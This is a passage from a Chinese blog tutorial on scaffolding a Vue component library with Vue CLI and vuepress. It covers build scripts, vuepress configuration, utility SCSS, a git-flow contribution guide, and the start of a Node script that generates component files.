      "content_html": "<div><p>前言</p>\n<p>本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路: 包括如何快速并优雅地构建 UI 库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等, 此文乃第二弹版本, 看过第一弹版本的小伙伴, 想必都知道第一弹版本的组件库文档 UI 是需要自己写的, 最近也是刚研究出来其实 vuepress 也可以作为组件库文档的 UI, 该文档 UI 绝对不输于第一弹版本的。</p>\n</div>\n\n<h2 id=\"前言\" tabindex=\"-1\"> 前言</h2>\n<p><a href=\"/views/vuejs/custom-component-library-first.html\">想看第一弹版本的小伙伴, 请戳我</a></p>\n<p>第二弹前期具备知识点</p>\n<ul>\n<li><a href=\"https://vuepress.vuejs.org/zh/\" target=\"_blank\" rel=\"noopener noreferrer\">vuepress</a></li>\n<li><a href=\"https://cli.vuejs.org/zh/\" target=\"_blank\" rel=\"noopener noreferrer\">Vue CLI</a></li>\n</ul>\n<h2 id=\"前置工作\" tabindex=\"-1\"> 前置工作</h2>\n<p>以下工作全部基于 Vue CLI 3.x, 所以首先要保证机子上有 <code>@vue/cli</code></p>\n<div><pre><code>vue create vtp-component <span># vtp-component 作为教学的库名</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><code>vue-router</code> , <code>dart-sass</code> , <code>babel</code> , <code>eslint</code> 这些是该项目使用的依赖项, 小主可以根据自己的需求进行相应的切换</p>\n<h2 id=\"start\" tabindex=\"-1\"> start</h2>\n<p>开始造轮子了, 以下示例代码 <a href=\"https://github.com/vxhly/vtp-component\" target=\"_blank\" rel=\"noopener noreferrer\">请戳这里</a></p>\n<h2 id=\"工作目录\" tabindex=\"-1\"> 工作目录</h2>\n<p>默认生成的 src 目录以及 public 目录在该项目下是没有作用的, 小主可以删掉了, 这么做的主要目的当然只是保留生成的 <code>package.json</code> 文件</p>\n<p>调整项目目录如下, 其中 build 文件夹用来存放编译脚本代码, docs 文件夹则是 vuepress 的主体部分了, 其中 .vuepress 是用来存放 vuepress 相关的配置文件, 而组件文档则放置在 docs 的根目录, packages 文件夹是用来存放组件的核心代码, scripts 文件夹用来存放自定义生成组件和组件的说明文档等脚本</p>\n<p>大致的目录结构如下：</p>\n<div><pre><code>|-- build\n|\n|-- docs\n    |-- .vuepress\n        |-- config.js\n        |-- enhanceApp.js\n    |-- README.md\n|\n|-- packages\n|   |-- index.js\n|\n|-- scripts\n|\n|-- config.js\n|\n|-- .npmrm\n|\n|-- .npmignore\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"添加编译脚本\" tabindex=\"-1\"> 添加编译脚本</h2>\n<div><p>注意</p>\n<p><code>core-js</code> 库需要采用的 2.6.5 这个版本, 高于这个版本的可能会导致开启文档失败</p>\n</div>\n<p><code>package.json</code> 其中的组件 name 推荐和创建的项目名一致</p>\n<div><pre><code><span>{</span>\n  <span>\"scripts\"</span><span>:</span> <span>{</span>\n    <span>\"build:lib\"</span><span>:</span> <span>\"vue-cli-service build --target lib --name vtp-component --dest lib packages/index.js\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>修改 main 主入口文件</p>\n<div><pre><code><span>{</span>\n  <span>\"main\"</span><span>:</span> <span>\"lib/vtp-component.common.js\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"一个组件例子\" tabindex=\"-1\"> 一个组件例子</h2>\n<h3 id=\"vuepress-配置\" tabindex=\"-1\"> vuepress 配置</h3>\n<p>这里提供一些简单的配置, 当然想要高级的配置甚至想要自定义主题皆可从官方文档中获取到帮助</p>\n<p><code>config.js</code> 使用插件 <code>vuepress-plugin-vue-demo</code> 将可以像 ElementUI 中写文档演示 demo 一样写文档了</p>\n<div><pre><code><span>const</span> config <span>=</span> <span>{</span>\n  <span>dest</span><span>:</span> <span>\"public\"</span><span>,</span>\n  <span>plugins</span><span>:</span> <span>[</span><span>\"vue-demo\"</span><span>]</span><span>,</span>\n  <span>serviceWorker</span><span>:</span> <span>true</span><span>,</span>\n  <span>themeConfig</span><span>:</span> <span>{</span>\n    <span>sidebar</span><span>:</span> <span>[</span>\n      <span>[</span><span>\"/CHANGELOG\"</span><span>,</span> <span>\"更新日志\"</span><span>]</span><span>,</span>\n      <span>[</span><span>\"/\"</span><span>,</span> <span>\"指南\"</span><span>]</span><span>,</span>\n      <span>{</span>\n        <span>title</span><span>:</span> <span>\"组件\"</span><span>,</span>\n        <span>collapsable</span><span>:</span> <span>false</span><span>,</span>\n        <span>children</span><span>:</span> <span>[</span><span>]</span><span>,</span>\n      <span>}</span><span>,</span>\n    <span>]</span><span>,</span>\n  <span>}</span><span>,</span>\n  <span>markdown</span><span>:</span> <span>{</span>\n    <span>lineNumbers</span><span>:</span> <span>true</span><span>,</span>\n  <span>}</span><span>,</span>\n  <span>title</span><span>:</span> <span>\"vtp-component\"</span><span>,</span>\n  <span>base</span><span>:</span> <span>\"/\"</span><span>,</span>\n<span>}</span><span>;</span>\n\nmodule<span>.</span>exports <span>=</span> config<span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>enhanceApp.js</code></p>\n<div><pre><code><span>import</span> <span>UI</span> <span>from</span> <span>\"../../packages\"</span><span>;</span>\n\n<span>export</span> <span>default</span> <span>(</span><span>{</span>\n  Vue<span>,</span> <span>// the version of Vue being used in the VuePress app</span>\n  options<span>,</span> <span>// the options for the root Vue instance</span>\n  router<span>,</span> <span>// the router instance for the app</span>\n  siteData<span>,</span> <span>// site metadata</span>\n<span>}</span><span>)</span> <span>=></span> <span>{</span>\n  Vue<span>.</span><span>use</span><span>(</span><span>UI</span><span>)</span><span>;</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"基础的-packages-配置\" tabindex=\"-1\"> 基础的 packages 配置</h3>\n<div><pre><code><span>import</span> <span>\"./assets/scss/common.scss\"</span><span>;</span>\n\n<span>const</span> version <span>=</span> <span>require</span><span>(</span><span>\"../package.json\"</span><span>)</span><span>.</span>version<span>;</span>\n<span>const</span> components <span>=</span> <span>[</span><span>]</span><span>;</span>\n\n<span>const</span> <span>install</span> <span>=</span> <span>(</span><span>Vue</span><span>)</span> <span>=></span> <span>{</span>\n  <span>if</span> <span>(</span>install<span>.</span>installed<span>)</span> <span>return</span><span>;</span>\n  components<span>.</span><span>map</span><span>(</span><span>(</span><span>component</span><span>)</span> <span>=></span> Vue<span>.</span><span>component</span><span>(</span>component<span>.</span>name<span>,</span> component<span>)</span><span>)</span><span>;</span>\n<span>}</span><span>;</span>\n\n<span>export</span> <span>{</span> install<span>,</span> version <span>}</span><span>;</span>\n\n<span>export</span> <span>default</span> <span>{</span>\n  install<span>,</span>\n  version<span>,</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span><span>$prefix</span></span><span>:</span> <span>\"vtp\"</span><span>;</span>\n\n<span>@for</span> <span>$i</span> <span>from</span> 12 <span>through</span> <span>48 </span><span>{</span>\n  <span>.<span>#{$prefix}</span>-fs<span>#{$i}</span> </span><span>{</span>\n    <span>font-size</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-lh<span>#{$i}</span> </span><span>{</span>\n    <span>line-height</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n<span>}</span>\n\n<span>@for</span> <span>$i</span> <span>from</span> 5 <span>through</span> <span>40 </span><span>{</span>\n  <span>.<span>#{$prefix}</span>-margin<span>#{$i}</span> </span><span>{</span>\n    <span>margin</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-padding<span>#{$i}</span> </span><span>{</span>\n    <span>padding</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-m-l<span>#{$i}</span> </span><span>{</span>\n    <span>margin-left</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-m-r<span>#{$i}</span> </span><span>{</span>\n    <span>margin-right</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-m-lr<span>#{$i}</span> </span><span>{</span>\n    <span>margin-left</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n    <span>margin-right</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-m-t<span>#{$i}</span> </span><span>{</span>\n    <span>margin-top</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-m-b<span>#{$i}</span> </span><span>{</span>\n    <span>margin-bottom</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-m-tb<span>#{$i}</span> </span><span>{</span>\n    <span>margin-top</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n    <span>margin-bottom</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-p-l<span>#{$i}</span> </span><span>{</span>\n    <span>padding-left</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-p-r<span>#{$i}</span> </span><span>{</span>\n    <span>padding-right</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-p-lf<span>#{$i}</span> </span><span>{</span>\n    <span>padding-left</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n    <span>padding-right</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-p-t<span>#{$i}</span> </span><span>{</span>\n    <span>padding-top</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-p-b<span>#{$i}</span> </span><span>{</span>\n    <span>padding-bottom</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span>.<span>#{$prefix}</span>-p-tb<span>#{$i}</span> </span><span>{</span>\n    <span>padding-top</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n    <span>padding-bottom</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>\n  <span>}</span>\n<span>}</span>\n\n<span>.<span>#{$prefix}</span>-tc </span><span>{</span>\n  <span>text-align</span><span>:</span> center <span>!important</span><span>;</span>\n<span>}</span>\n\n<span>.<span>#{$prefix}</span>-tl </span><span>{</span>\n  <span>text-align</span><span>:</span> left <span>!important</span><span>;</span>\n<span>}</span>\n\n<span>.<span>#{$prefix}</span>-tr </span><span>{</span>\n  <span>text-align</span><span>:</span> right <span>!important</span><span>;</span>\n<span>}</span>\n\n<span>.<span>#{$prefix}</span>-fl </span><span>{</span>\n  <span>float</span><span>:</span> left <span>!important</span><span>;</span>\n<span>}</span>\n\n<span>.<span>#{$prefix}</span>-fr </span><span>{</span>\n  <span>float</span><span>:</span> riaght <span>!important</span><span>;</span>\n<span>}</span>\n\n<span>.<span>#{$prefix}</span>-cl-both </span><span>{</span>\n  <span>clear</span><span>:</span> both <span>!important</span><span>;</span>\n<span>}</span>\n\n<span>.<span>#{$prefix}</span>-fw-b </span><span>{</span>\n  <span>font-weight</span><span>:</span> bold <span>!important</span><span>;</span>\n<span>}</span>\n\n<span>.<span>#{$prefix}</span>-absolute </span><span>{</span>\n  <span>position</span><span>:</span> absolute <span>!important</span><span>;</span>\n<span>}</span>\n\n<span>.<span>#{$prefix}</span>-relative </span><span>{</span>\n  <span>position</span><span>:</span> relative <span>!important</span><span>;</span>\n<span>}</span>\n\n<span>.<span>#{$prefix}</span>-fixed </span><span>{</span>\n  <span>position</span><span>:</span> fixed <span>!important</span><span>;</span>\n<span>}</span>\n\n<span>.<span>#{$prefix}</span>-flex </span><span>{</span>\n  <span>display</span><span>:</span> flex<span>;</span>\n<span>}</span>\n\n<span>.<span>#{$prefix}</span>-f-sc </span><span>{</span>\n  <span>align-self</span><span>:</span> center<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"主入口-readme\" tabindex=\"-1\"> 主入口 README</h3>\n<div><pre><code><span><span>#</span> 指南</span>\n\n<span><span>##</span> 介绍</span>\n\n::: tip 提示\n\n开箱即用的 Vue 组件库\n\n:::\n\n<span><span>##</span> Install</span>\n\n\\ <span>`\\`</span> \\`bash npm install vtp\n\n<span><span>#</span> or</span>\n\nyarn add vtp \\ <span>`\\`</span> \\`\n\n<span><span>##</span> Used</span>\n\n<span><span>###</span> 一键全局引入</span>\n\n\\ <span>`\\`</span> \\`javascript import Vue from 'vue' import Vtp from 'vtp'\n\nVue.use(Vtp) \\ <span>`\\`</span> \\`\n\n<span><span>###</span> 按需引入</span>\n\n\\ <span>`\\`</span> \\`javascript import Vue from 'vue' import { VtpButton } from 'vtp'\n\nVue.use(VtpButton) \\ <span>`\\`</span> \\`\n\n<span><span>##</span> 组件库贡献指南</span>\n\n::: danger 必读\n\n组件库贡献必读, 请严格按照下列贡献指南\n\n:::\n\n<span>1.</span>  第一次使用该组件库时, 请执行命令 <span>`npm run init`</span>\n<span>2.</span>  推荐使用 <span>[<span>git-flow 工作流</span>](<span>https://www.git-tower.com/learn/git/ebook/cn/command-line/advanced-topics/git-flow</span>)</span>, 确保一个组件一个分支, 使用命令 <span>`git flow feature start [组件名]`</span> , 开发结束之后需要使用命令 <span>`git flow feature finish [组件名]`</span> 该命令将会自动进行分支合并以及删除当前分支\n<span>3.</span>  当需要对一个已存在的组件进行更新维护或者升级时, 请使用命令 <span>`git flow hotfix start [组件名]`</span> , 开发结束之后需要使用命令 <span>`git flow hotfix finish [组件名]`</span> 该命令将会自动进行分支合并以及删除当前分支\n<span>4.</span>  当需要对一个已存在的组件进行 bug 修复时, 请使用命令 <span>`git flow bugfix start [组件名]`</span> , 开发结束之后需要使用命令 <span>`git flow bugfix finish [组件名]`</span> 该命令将会自动进行分支合并以及删除当前组件分支\n<span>5.</span>  强制使用已配置脚本命令 <span>`yarn new:comp`</span> 来创建一个组件以及组件文档(已包含默认模板, 在此基础上修改即可), 使用命令 <span>`yarn del:comp`</span> 来删除不需要的组件\n<span>6.</span>  使用 <span>`git cz`</span> 替换 <span>`git commit -m`</span> , commit 之前请详细阅读 <span>[<span>git commit 规范指南</span>](<span>/archives/fdd4f330.html</span>)</span>\n<span>7.</span>  组件发布前, 请确保当前版本的所有包含组件已经全部开发完毕并且已经合并至 develop 分支\n\n<span>    - 在 develop 分支中使用 `git flow release start [版本号]` 创建一个发布版本分支\n    - 修改 `package.json` 中的 `version` 字段为当前的版本号\n    - 执行 `npm run docs:build` 编译 vuepress 文档\n    - 执行 `npm run build:lib` 编译 组件库\n    - 执行 `npm run changelog` 生成当前版本的 CHANGELOHG\n    - 以上操作可使用命令 `npm run build` 来代替 `npm run docs:build` 、 `npm run build:lib` 、 `npm run changelog`\n    - 进行 commit 操作\n    - 使用 `git flow release finish [版本号]` 自动进行分支合并以及删除当前分支, 期间将会询问 tag 的 commit 信息(务必认真填写)\n    - 以上操作之后将会把分支自动合并至 master 和 develop 分支</span>\n\n<span>8.</span>  分支永远只能有两个 master 和 develop 分支, 其他分支应该在开发完毕之后及时的进行合并、删除操作\n<span>9.</span>  发布前请确保 tag 已经打包成功, 当前版本的功能已经全部完成, 之后便可以直接运行 <span>`npm publish --registry &lt;私有库地址>`</span> , 如果组件库目录下有配置 <span>`.npmrc`</span> 则直接使用 <span>`npm publish`</span>\n<span>10.</span> 下载组件库 <span>`yarn add &lt;组件库名> --registry &lt;私有库地址>`</span> , 如果组件库目录下有配置 <span>`.npmrc`</span> 则直接使用 <span>`yarn add &lt;组件库名> `</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"创建组件和组件文档生成脚本\" tabindex=\"-1\"> 创建组件和组件文档生成脚本</h3>\n<p>在 <code>scripts</code> 中创建以下几个文件, 其中 <code>create-comp.js</code> 是用来生成自定义组件目录和自定义组件说明文档脚本, <code>delete-comp.js</code> 是用来删除无用的组件目录和自定义组件说明文档脚本, <code>template.js</code> 是生成代码的模板文件</p>\n<div><pre><code>|-- create-comp.js\n|\n|-- delete-comp.js\n|\n|-- template.js\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>相关的代码如下, 小主可以根据自己的需求进行相应的简单修改, 下面的代码参考来源 <a href=\"https://juejin.im/post/5c6772ff518825629c56943c\" target=\"_blank\" rel=\"noopener noreferrer\">vue-cli3 项目优化之通过 node 自动生成组件模板 generate View、Component</a>, 当然也是第一弹中的代码改进</p>\n<p>全局可配置一些变量</p>\n<p><code>config.js</code></p>\n<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>\n  <span>prefix</span><span>:</span> <span>\"vtp\"</span><span>,</span> <span>// 组件库的前缀,使用小写</span>\n  <span>docsTitle</span><span>:</span> <span>\"vtp-component\"</span><span>,</span> <span>// 文档的标题</span>\n  <span>base</span><span>:</span> <span>\"/\"</span><span>,</span> <span>// vuepress 中的 base 配置</span>\n  <span>ElementUI</span><span>:</span> <span>true</span><span>,</span> <span>// 引入 element-ui 表示二次封装 element-ui</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>create-comp.js</code></p>\n<div><pre><code><span>// 创建自定义组件脚本</span>\n\n<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>\"chalk\"</span><span>)</span><span>;</span>\n<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n<span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>\"fs-extra\"</span><span>)</span><span>;</span>\n<span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>\"uppercamelcase\"</span><span>)</span><span>;</span>\n<span>const</span> <span>resolve</span> <span>=</span> <span>(</span><span><span>...</span>file</span><span>)</span> <span>=></span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>...</span>file<span>)</span><span>;</span>\n<span>const</span> <span>log</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n<span>const</span> <span>successLog</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>blue</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n<span>const</span> <span>errorLog</span> <span>=</span> <span>(</span><span>error</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>red</span><span>(</span><span><span>`</span><span><span>${</span>error<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n<span>const</span> <span>{</span>\n  vueTemplate<span>,</span>\n  entryTemplate<span>,</span>\n  scssTemplate<span>,</span>\n  mdDocs<span>,</span>\n<span>}</span> <span>=</span> <span>require</span><span>(</span><span>\"./template\"</span><span>)</span><span>;</span>\n\n<span>const</span> <span>generateFile</span> <span>=</span> <span>(</span><span>path<span>,</span> data</span><span>)</span> <span>=></span> <span>{</span>\n  <span>if</span> <span>(</span>fs<span>.</span><span>existsSync</span><span>(</span>path<span>)</span><span>)</span> <span>{</span>\n    <span>errorLog</span><span>(</span><span><span>`</span><span><span>${</span>path<span>}</span></span><span>文件已存在</span><span>`</span></span><span>)</span><span>;</span>\n    <span>return</span><span>;</span>\n  <span>}</span>\n  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>\n    fs<span>.</span><span>writeFile</span><span>(</span>path<span>,</span> data<span>,</span> <span>\"utf8\"</span><span>,</span> <span>(</span><span>err</span><span>)</span> <span>=></span> <span>{</span>\n      <span>if</span> <span>(</span>err<span>)</span> <span>{</span>\n        <span>errorLog</span><span>(</span>err<span>.</span>message<span>)</span><span>;</span>\n        <span>reject</span><span>(</span>err<span>)</span><span>;</span>\n      <span>}</span> <span>else</span> <span>{</span>\n        <span>resolve</span><span>(</span><span>true</span><span>)</span><span>;</span>\n      <span>}</span>\n    <span>}</span><span>)</span><span>;</span>\n  <span>}</span><span>)</span><span>;</span>\n<span>}</span><span>;</span>\n\n<span>// 这里生成自定义组件</span>\n<span>log</span><span>(</span><span>\"请输入要生成的组件名称, 形如 demo 或者 demo-test\"</span><span>)</span><span>;</span>\n<span>let</span> componentName <span>=</span> <span>\"\"</span><span>;</span>\nprocess<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>\"data\"</span><span>,</span> <span>async</span> <span>(</span><span>chunk</span><span>)</span> <span>=></span> <span>{</span>\n  <span>const</span> inputName <span>=</span> <span>String</span><span>(</span>chunk<span>)</span><span>.</span><span>trim</span><span>(</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>\n  <span>const</span> upperInputname <span>=</span> <span>uppercamelize</span><span>(</span>inputName<span>)</span><span>;</span>\n  <span>const</span> componentDirectory <span>=</span> <span>resolve</span><span>(</span><span>\"../packages\"</span><span>,</span> upperInputname<span>)</span><span>;</span>\n  <span>const</span> componentVueName <span>=</span> <span>resolve</span><span>(</span>componentDirectory<span>,</span> <span><span>`</span><span><span>${</span>upperInputname<span>}</span></span><span>.vue</span><span>`</span></span><span>)</span><span>;</span>\n  <span>const</span> scssName <span>=</span> <span>resolve</span><span>(</span>componentDirectory<span>,</span> <span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>.scss</span><span>`</span></span><span>)</span><span>;</span>\n  <span>const</span> entryComponentName <span>=</span> <span>resolve</span><span>(</span>componentDirectory<span>,</span> <span>\"index.js\"</span><span>)</span><span>;</span>\n\n  <span>const</span> hasComponentDirectory <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span>componentDirectory<span>)</span><span>;</span>\n  <span>if</span> <span>(</span>upperInputname<span>)</span> <span>{</span>\n    <span>// 这里生成组件</span>\n    <span>if</span> <span>(</span>hasComponentDirectory<span>)</span> <span>{</span>\n      <span>errorLog</span><span>(</span><span><span>`</span><span><span>${</span>upperInputname<span>}</span></span><span>组件目录已存在, 请重新输入</span><span>`</span></span><span>)</span><span>;</span>\n      <span>return</span><span>;</span>\n    <span>}</span> <span>else</span> <span>{</span>\n      <span>log</span><span>(</span><span><span>`</span><span>生成 component 目录 </span><span><span>${</span>componentDirectory<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n      <span>await</span> <span>dotExistDirectoryCreate</span><span>(</span>componentDirectory<span>)</span><span>;</span>\n    <span>}</span>\n    <span>try</span> <span>{</span>\n      <span>if</span> <span>(</span>upperInputname<span>.</span><span>includes</span><span>(</span><span>\"/\"</span><span>)</span><span>)</span> <span>{</span>\n        <span>const</span> inputArr <span>=</span> upperInputname<span>.</span><span>split</span><span>(</span><span>\"/\"</span><span>)</span><span>;</span>\n        componentName <span>=</span> inputArr<span>[</span>inputArr<span>.</span>length <span>-</span> <span>1</span><span>]</span><span>;</span>\n      <span>}</span> <span>else</span> <span>{</span>\n        componentName <span>=</span> upperInputname<span>;</span>\n      <span>}</span>\n      <span>log</span><span>(</span><span><span>`</span><span>生成 vue 文件 </span><span><span>${</span>componentVueName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n      <span>await</span> <span>generateFile</span><span>(</span>componentVueName<span>,</span> <span>vueTemplate</span><span>(</span>inputName<span>)</span><span>)</span><span>;</span>\n      <span>log</span><span>(</span><span><span>`</span><span>生成 scss 文件 </span><span><span>${</span>scssName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n      <span>await</span> <span>generateFile</span><span>(</span>scssName<span>,</span> <span>scssTemplate</span><span>(</span>inputName<span>)</span><span>)</span><span>;</span>\n      <span>log</span><span>(</span><span><span>`</span><span>生成 entry 文件 </span><span><span>${</span>entryComponentName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n      <span>await</span> <span>generateFile</span><span>(</span>entryComponentName<span>,</span> <span>entryTemplate</span><span>(</span>componentName<span>)</span><span>)</span><span>;</span>\n      <span>successLog</span><span>(</span><span>\"生成 component 成功\"</span><span>)</span><span>;</span>\n    <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>\n      <span>errorLog</span><span>(</span>e<span>.</span>message<span>)</span><span>;</span>\n    <span>}</span>\n  <span>}</span> <span>else</span> <span>{</span>\n    <span>errorLog</span><span>(</span><span><span>`</span><span>请重新输入组件名称:</span><span>`</span></span><span>)</span><span>;</span>\n    <span>return</span><span>;</span>\n  <span>}</span>\n\n  <span>// 这里生成自定义组件说明文档</span>\n  <span>const</span> docsDirectory <span>=</span> <span>resolve</span><span>(</span><span>\"../docs/component\"</span><span>)</span><span>;</span>\n  <span>const</span> docsMdName <span>=</span> <span>resolve</span><span>(</span>docsDirectory<span>,</span> <span><span>`</span><span><span>${</span>upperInputname<span>}</span></span><span>.md</span><span>`</span></span><span>)</span><span>;</span>\n\n  <span>try</span> <span>{</span>\n    <span>log</span><span>(</span><span><span>`</span><span>生成 component 文档 </span><span><span>${</span>docsMdName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n    <span>await</span> <span>generateFile</span><span>(</span>docsMdName<span>,</span> <span>mdDocs</span><span>(</span><span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n    <span>successLog</span><span>(</span><span>\"生成 component 文档成功\"</span><span>)</span><span>;</span>\n  <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>\n    <span>errorLog</span><span>(</span>e<span>.</span>message<span>)</span><span>;</span>\n  <span>}</span>\n\n  process<span>.</span>stdin<span>.</span><span>emit</span><span>(</span><span>\"end\"</span><span>)</span><span>;</span>\n<span>}</span><span>)</span><span>;</span>\n\nprocess<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>\"end\"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>\n  <span>log</span><span>(</span><span>\"exit\"</span><span>)</span><span>;</span>\n  process<span>.</span><span>exit</span><span>(</span><span>)</span><span>;</span>\n<span>}</span><span>)</span><span>;</span>\n\n<span>function</span> <span>dotExistDirectoryCreate</span><span>(</span><span>directory</span><span>)</span> <span>{</span>\n  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve</span><span>)</span> <span>=></span> <span>{</span>\n    <span>mkdirs</span><span>(</span>directory<span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>\n      <span>resolve</span><span>(</span><span>true</span><span>)</span><span>;</span>\n    <span>}</span><span>)</span><span>;</span>\n  <span>}</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>// 递归创建目录</span>\n<span>function</span> <span>mkdirs</span><span>(</span><span>directory<span>,</span> callback</span><span>)</span> <span>{</span>\n  <span>var</span> exists <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span>directory<span>)</span><span>;</span>\n  <span>if</span> <span>(</span>exists<span>)</span> <span>{</span>\n    <span>callback</span><span>(</span><span>)</span><span>;</span>\n 